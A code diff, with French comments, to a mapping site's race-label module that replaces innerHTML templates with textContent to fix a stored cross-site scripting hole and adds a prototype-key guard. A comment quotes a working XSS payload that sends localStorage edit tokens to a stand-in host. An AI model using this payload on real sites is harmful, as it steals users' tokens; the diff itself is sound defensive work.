@@ -82,6 +82,54 @@ export const rangPicto = (cle) => (RANGS.has(cle) ? RANGS.get(cle) : ORDRE_PICTO
 const CART_H = 26 // hauteur fixe d'un cartouche (px) — pas de mesure DOM
 const CHIP_H = 18
 
+// ⚠️ PLUS AUCUN HTML INTERPOLÉ DANS LES CARTOUCHES. Les trois gabarits de
+// buildNode() posaient `cart.innerHTML = \`…${item.name}…\`` — et `item.name`
+// vient soit d'un <wpt><name> de GPX déposé, soit du payload d'un lien
+// /r/<id>, que N'IMPORTE QUI peut publier (netlify/functions/race.mjs
+// n'inspecte que le type et la taille de `body.race`). Une course nommée
+// `<img src=x onerror=fetch('//moi/'+localStorage.getItem('shibumap.race.secrets'))>`
+// s'exécutait dans le DOM de shibumap.com chez CHAQUE destinataire du lien,
+// et en repartait avec les jusqu'à 50 jetons d'édition rangés là par
+// share-link.js — de quoi réécrire par PUT légitime les parcours d'autres
+// organisateurs. Le nom seul suffisait : main.js pousse le cartouche de départ
+// dès que `raceState.name` ou `raceState.logo` est non vide, sans qu'aucun
+// point de passage ne soit nécessaire.
+// Le même bug avait déjà été trouvé, corrigé et verrouillé dans
+// src/ui/carnet-course.js — ce fichier-ci, qui lit exactement la même donnée,
+// était resté troué. textContent ne peut pas exécuter : c'est la seule parade
+// qui ne s'oublie pas.
+const el = (tag, cls, parent) => {
+  const n = document.createElement(tag)
+  if (cls) n.className = cls
+  parent?.appendChild(n)
+  return n
+}
+
+// LE SEUL HTML QUI RESTE : les pictos, un dictionnaire de CONSTANTES du dépôt
+// (PICTOS ci-dessus), jamais une chaîne venue d'un GPX ou d'un lien partagé.
+// ⚠️ GARDE DE PROPRIÉTÉ PROPRE, pas un `|| ''` : la clé, elle, est bien une
+// donnée tierce (parseRace force les pictos en chaînes mais n'en valide pas le
+// contenu) et Object.freeze ne coupe pas la chaîne de prototypes — un
+// `pictos: ["constructor"]` rendait une FONCTION, truthy, donc un innerHTML
+// « function Object() { [native code] } ». Même geste que
+// src/ui/carnet-course.js (majPictos).
+// Le <template> évite d'emballer chaque SVG dans un <span> : la feuille vise
+// `.rl-chip svg` et `.rl-picto svg` en descendants directs, et le picto d'un
+// chip est un ITEM DE FLEX (gap 4px) — un emballage aurait décalé le rendu.
+// → le NOMBRE d'icônes réellement posées (0 = aucune clé connue), pour que
+// l'appelant décide s'il garde son enveloppe.
+function poseIcones(parent, cles) {
+  let posees = 0
+  for (const cle of cles) {
+    if (!Object.hasOwn(PICTOS, cle)) continue
+    const boite = document.createElement('template')
+    boite.innerHTML = PICTOS[cle]
+    parent.append(...boite.content.childNodes)
+    posees++
+  }
+  return posees
+}
+
 // ══════════ LES CARTOUCHES SUIVENT LE RELIEF (mode continu 3×3) ═════════════
 //
 // `item.world` vient de `gpx.track.world`, cuit en coordonnées de CHAMP
@@ -118,24 +166,40 @@ export function buildRaceLabels({ container, camera, getItems, params, onRemove,
       // l'étiquette la PLUS importante (Adrien) : fond INVERSÉ (encre), logo
       // passé en blanc, km dans un GROS encadré couleur, START / FINISH en
       // gros, pictos (≤8) en dessous — toujours visible, jamais fenêtrée
-      const logo = item.logo ? `<img class="rl-start-logo" src="${item.logo}" alt="">` : ''
-      const pictos = (item.pictos || []).slice(0, 8).map((p) => PICTOS[p] || '').join('')
-      cart.innerHTML = `${logo}<span class="rl-start-main">
-        ${item.name ? `<b class="rl-start-name">${item.name}</b>` : ''}
-        <span class="rl-start-word">${item.word || 'START'}</span>
-        ${pictos ? `<span class="rl-picto">${pictos}</span>` : ''}
-      </span><span class="rl-start-km">${item.totalKm} KM</span>`
+      if (item.logo) {
+        // .src est une PROPRIÉTÉ : plus de guillemet à casser dans un attribut.
+        // Le contenu, lui, est validé en amont (race-model.parseRace applique
+        // LOGO_DATA_URL_RE) — ici on ne fait plus que le poser.
+        const img = el('img', 'rl-start-logo', cart)
+        img.src = item.logo
+        img.alt = ''
+      }
+      const principal = el('span', 'rl-start-main', cart)
+      if (item.name) el('b', 'rl-start-name', principal).textContent = item.name
+      el('span', 'rl-start-word', principal).textContent = item.word || 'START'
+      // posé APRÈS coup : une clé inconnue ne rend rien, et un .rl-picto vide
+      // est un rectangle sombre visible (la feuille lui donne un fond)
+      const icones = el('span', 'rl-picto')
+      if (poseIcones(icones, (item.pictos || []).slice(0, 8))) principal.appendChild(icones)
+      el('span', 'rl-start-km', cart).textContent = `${item.totalKm} KM`
     } else if (isChip) {
-      cart.innerHTML = `${PICTOS[item.pictos?.[0]] || PICTOS.bus}<span>${item.name}</span><span class="rl-x" title="Retirer">✕</span>`
-      cart.querySelector('.rl-x').addEventListener('click', (e) => { e.stopPropagation(); onRemove?.(item.id) })
+      if (!poseIcones(cart, [item.pictos?.[0]])) poseIcones(cart, ['bus'])
+      el('span', '', cart).textContent = item.name
+      const croix = el('span', 'rl-x', cart)
+      croix.title = 'Retirer'
+      croix.textContent = '✕'
+      croix.addEventListener('click', (e) => { e.stopPropagation(); onRemove?.(item.id) })
     } else {
-      const km = item.km != null ? `<span class="rl-km">${(+item.km).toFixed(item.km % 1 ? 1 : 0)}</span>` : ''
-      const pictos = item.pictos?.length ? `<span class="rl-picto">${item.pictos.map((p) => PICTOS[p] || '').join('')}</span>` : ''
+      if (item.km != null) el('span', 'rl-km', cart).textContent = (+item.km).toFixed(item.km % 1 ? 1 : 0)
+      el('span', 'rl-name', cart).textContent = item.name || '—'
+      if (item.pictos?.length) {
+        const icones = el('span', 'rl-picto')
+        if (poseIcones(icones, item.pictos)) cart.appendChild(icones)
+      }
       const subBits = []
       if (item.alt != null) subBits.push(`${Math.round(item.alt)} m`)
       if (item.cutoff) subBits.push(`barrière ${item.cutoff}`)
-      const sub = subBits.length ? `<span class="rl-sub">${subBits.join(' · ')}</span>` : ''
-      cart.innerHTML = `${km}<span class="rl-name">${item.name || '—'}</span>${pictos}${sub}`
+      if (subBits.length) el('span', 'rl-sub', cart).textContent = subBits.join(' · ')
     }
     const anchor = document.createElement('i')
     anchor.className = 'rl-anchor'
